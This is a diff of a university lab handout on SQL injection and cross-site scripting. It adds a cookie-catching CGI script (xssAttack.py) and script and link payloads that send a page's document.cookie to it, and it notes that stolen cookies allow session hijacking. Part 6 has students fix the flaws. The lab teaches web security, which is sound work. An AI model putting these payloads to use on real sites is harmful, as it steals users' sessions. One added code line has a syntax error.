@@ -1,6 +1,6 @@
 # SQL Injection and XSS Vulnerabilities #
 
-This week, we will investigate SQL Injection and Cross Site Scripting vulnerabilities. Parts 1 and 2 will cover SQL Injection while Parts X to Y will cover Cross-site Scripting.
+This week, we will investigate SQL Injection and Cross Site Scripting vulnerabilities. Parts 1 and 2 will cover SQL Injection while Parts 3 to 6 will cover Cross-site Scripting.
 
 From Wikipedia, we have the following definitions:
 
@@ -255,10 +255,10 @@ import time, Cookie
 cookie = Cookie.SimpleCookie()
 
 # The SimpleCookie instance is a mapping
-cookie['seng360'] = str(time.time())
+cookie['seng360'] = 'secret-'str(time.time())
 
 # Output the HTTP message containing the cookie
-#print cookie
+print cookie
 print 'Content-Type: text/html\n'
 
 # Create instance of FieldStorage 
@@ -268,8 +268,7 @@ user = form.getvalue('user')
 if "user" not in form:
     print "No <b>user</b> field has been set."
 else:
-   print "<h3>Hello [" + user + "]"
-   print "</h3>"
+    print "<h3>Hello [" + user + "]</h3>"
 
 print '<br><hr>'
 print 'Server time is', time.asctime(time.localtime())
@@ -304,34 +303,68 @@ User: <input type="text" name="user"><br>
 
 Test it. It should behave as expected.
 
+Lastly, we need to create the redirection target for our xss attack. This page will intercept and display the cookie.
+
+Create another file and name it `xssAttack.py`
+
+```python
+#!/usr/bin/env python
+
+import cgi, cgitb
+import time, Cookie
+
+print 'Content-Type: text/html\n'
+
+# Create instance of FieldStorage
+form = cgi.FieldStorage()
+cookie = form.getvalue('cookie')
+
+if "cookie" not in form:
+    print "No <b>cookie</b> intercepted\n"
+else:
+    print "Intercepted Cookie: " + cookie + "\n"
+
+print '<br><hr>'
+print 'Server time is', time.asctime(time.localtime())
+print '</body></html>'
+```
+
 ## Stealing the cookie ##
 
 Now pass the following string in the user field:
 
-	<a href="xssCookies.py" onClick="javascript:document.location.replace('http://turingmachine.org/text' + escape(document.cookie)); return false;">my name</a>
+	<a href="xssCookies.py" onClick="javascript:document.location.replace('http://localhost:3080/cgi-bin/xssAttack.py?cookie=' + escape(document.cookie)); return false;">victim</a>
 
-As you can see, the location where the *Name* should be displayed is now replaced with a link. Follow it. Look at the resulting URL. This URL does not exist, but inspect the URL that you were trying to retrieve.
+As you can see, the location where the username should be displayed is now replaced with a "victim" link. Follow it. Look at the resulting URL. Inspect the URL that you were trying to retrieve.
 
 **Question 6:** What URL is displayed when the mouse is hovered over the link?
 
-**Question 7:** What is the full URL that is actually the link is followed? Why is this an attack?
+**Question 7:** What is the full URL that the link actually went to? Why is this an attack?
 
-This attack is very pernicious. It is capable of stealing all the cookies of a site by simply logging the access to the destination website.
+This attack is very pernicious. It is capable of stealing all the cookies of a site by simply logging the access to the destination website. At this point, you could easily forge a cookie and hijack that session.
+
+Try passing the following string into the user field:
+
+	<script>document.location="http://localhost:3080/cgi-bin/xssAttack.py?cookie="+document.cookie</script>
+
+**Question 8:** What happens when you click submit? Is this expected?
 
 # Part 5: Cross-scripting attacks using Chrome #
 
 Try the same attacks on Chrome.
 
-**Question 8:** Which of the attacks did not succeed when using Chromium? Why?
+**Question 9:** Which of the attacks did not succeed when using Chrome? Why?
 
 # Part 6: Fix the XSS vulnerabilities
 
-Fix the vulnerabilities in your scripts `xssSimple.py` and `xssCookies.py`. Hint: see *cgi.escape* in [https://docs.python.org/2/library/cgi.html](https://docs.python.org/2/library/cgi.html)
+Fix the vulnerabilities in your scripts `xssSimple.py` and `xssCookies.py`.
+
+- Hint: see *cgi.escape* in [https://docs.python.org/2/library/cgi.html](https://docs.python.org/2/library/cgi.html)
 
 # Submission #
 
 You will be submitting three files separately (do **not** zip them):
 
-- `report.txt` Your answers to the 8 questions
+- `report.txt` Your answers to the 9 questions
 - `xssSimple.py` Your fixed form script
 - `xssCookies.py` Your fixed cookies script
